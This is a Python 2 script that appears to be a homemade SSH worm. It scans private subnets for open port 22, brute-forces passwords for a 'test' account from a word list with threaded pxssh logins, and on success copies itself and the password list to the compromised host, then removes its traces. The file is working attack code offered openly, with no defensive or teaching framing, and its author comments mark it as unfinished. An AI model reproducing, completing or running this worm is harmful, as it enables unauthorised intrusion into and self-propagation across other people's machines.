#!/usr/bin/python
#Author: thejester34
#This only works on linux systems and Mac systems!

from sys import argv
from threading import *
import subprocess, pxssh, time, nmap

maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0

def findTgts(subNet): #fix this subnet scanner as soon as possible!!!
    nmScan = nmap.PortScanner()
    nmScan.scan(subNet, '22')
    tgtHosts = []
    for tgtHost in nmScan.all_hosts():
        if nmScan[tgtHost].has_tcp(22):
            state = nmScan[tgtHost]['tcp'][22]['state']
            if state == 'open':
                print 'Found target: ' + tgtHost
                tgtHosts.append(tgtHost)
    return tgtHosts

def Worm(s):
    s.sendline('scp /root/Desktop/sshWorm_and_Botnet/product/pass.txt /root/Desktop/sshWorm_and_Botnet/product/Kelp_Worm.py /home/test/') #sharpen this code to be universal later!
    s.prompt()
    print(s.before)
    script = argv
    name = str(script[0])
    for i in range(1, 3):
        directoryName = 'copy' + str(i)
        s.sendline('mkdir ' + directoryName)
        s.prompt()
        s.sendline('cp ' + name + ' ' + directoryName)
        s.prompt()
        s.sendline('cp pass.txt ' + directoryName)
    s.sendline('rm Kelp_Worm.py')
    s.prompt()
    s.sendline('rm pass.txt')
    s.prompt()

def connect(host, user, password, release):
    global Found
    global Fails
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print '\nPassword found: ' + password
        Found = True
        Worm(s) #this will activate the worm function and login into ssh
    except Exception, e:
        if 'reading_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)
    finally:
        if release:
            connection_lock.release()

def main():
    passFile = open('pass.txt', 'r')
    tgtHosts = findTgts(str('192.168.0.1-255'))
    tgtHosts = findTgts(str('10.0.0.1-255'))
    tgtHosts = findTgts(str('172.16.0.1-255'))
    for host in tgtHosts:
        user = 'test'
        for Pass in passFile.readlines():
            if Found:
                print "password found, exiting"
                exit(0)
            if Fails > 5:
                print "too many socket timeouts"
                exit(0)
            connection_lock.acquire()
            password = Pass.strip('\r').strip('\n')
            t = Thread(target=connect, args=(host, user, password, True))
            child = t.start()

if __name__ == '__main__':
    main()
